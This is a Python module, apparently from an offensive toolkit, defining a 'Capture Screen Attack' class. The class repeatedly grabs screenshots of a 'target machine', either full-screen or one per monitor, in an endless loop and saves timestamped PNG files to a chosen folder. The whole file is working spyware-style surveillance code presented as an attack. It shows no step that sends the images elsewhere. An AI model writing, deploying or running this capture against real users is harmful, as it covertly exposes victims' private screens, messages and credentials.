from .attack import Attack
from PIL import ImageGrab, Image
import screeninfo
from time import sleep
from tools import (
    _path_joiner,
    create_new_dir,
    check_folder_exits,
    get_current_time
)
from rich import print

class CaptureScreen(Attack):
    def __init__(self,
                 file_path: str, 
                 period: int = 20,
                 grap_num: int = 1,
                 full_screen: bool = False):
        """Capture the screen of the target machine.

        Args:
            period (int, optional): Period of screen capture. Defaults to 20.
            grap_num (int, optional): Number of screen captures. Defaults to 1.
            file_path (str): Path to save the screen captures.
            full_screen (bool, optional): Capture the full screen or sperate screens. Defaults to False.
        """
        super().__init__("Capture Screen Attack", 
                         f"This attack captures the screen of the target machine every {period} seconds for {grap_num} times.")
        self.period = period
        self.grap_num = grap_num
        self.file_path = file_path
        self.full_screen = full_screen
        
        self._prepare() # prepare the file path for saving the screen captures


    def execute(self):
        self.running = True
        while self.running:
            for _ in range(self.grap_num):
                self.grap_screen(full_screen=self.full_screen)
            sleep(self.period)
    
    def grap_screen(self, full_screen: bool = True):
        
        if full_screen:
            im = ImageGrab.grab()
            self._save_image(im, "full_screen")
        else:
            for screen in screeninfo.get_monitors():
                im = ImageGrab.grab(bbox=(screen.x, 
                                          screen.y, 
                                          screen.width + screen.x, 
                                          screen.height + screen.y))
                self._save_image(im, screen.name)

    def _save_image(self, image: Image, file_name: str, format: str="png"):
        now = get_current_time(string=True)
        file_path = _path_joiner(self.file_path, f"{now}_{file_name}.{format}")

        try:
            image.save(file_path)
            print(f"[cyan]Screen capture saved: {file_name}.{format}[/cyan]")
        except Exception as e:
            print(f"[Save Image] Error: {e}")

    def _prepare(self):
        if not check_folder_exits(self.file_path):
            create_new_dir(self.file_path)